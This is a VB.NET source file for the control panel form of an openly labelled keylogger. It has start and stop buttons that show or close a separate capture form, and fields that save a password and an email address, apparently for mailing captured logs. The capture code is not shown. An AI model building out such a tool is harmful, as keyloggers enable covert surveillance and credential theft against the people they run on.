Public Class controlpanel


    Dim drag As Boolean
    Dim mousex As Integer
    Dim mousey As Integer

    Private Sub Form1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown
        drag = True
        mousex = Windows.Forms.Cursor.Position.X - Me.Left
        mousey = Windows.Forms.Cursor.Position.Y - Me.Top
    End Sub

    Private Sub Form1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseMove
        If drag Then
            Me.Top = Windows.Forms.Cursor.Position.Y - mousey
            Me.Left = Windows.Forms.Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub Form1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseUp
        drag = False
    End Sub

    
    
    Private Sub controlpanel_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label1.Text = "Welcome, " + My.Settings.USER
    End Sub

    
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Me.Close()
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        Me.Hide()

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TextBox1.Text = "keylogger started at: " & Now & vbNewLine

        Form1.Show()
        Button1.Enabled = False
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        TextBox1.Text &= vbNewLine & "keylogger stopped at: " & Now & vbNewLine

        Form1.Close()
        Button1.Enabled = True
    End Sub


    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        TrackBar1.Value = 0
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If (TextBox2.Text = vbNullString) Or (TextBox3.Text = vbNullString) Then
        ElseIf (Not (TextBox2.Text = vbNullString And Not TextBox3.Text = vbNullString)) Then
            My.Settings.PASSWORD = TextBox2.Text
            My.Settings.mail = TextBox3.Text
            My.Settings.Save()
            Label8.Text = "Settings has been saved!"
        ElseIf (Not (TextBox2.Text = vbNullString) And (TextBox3.Text = vbNullString)) Then
            My.Settings.PASSWORD = TextBox2.Text
            My.Settings.Save()
            Label8.Text = "Settings has been saved!"
        Else
            My.Settings.mail = TextBox3.Text
            My.Settings.Save()
            Label8.Text = "Settings has been saved!"
        End If
    End Sub
End Class
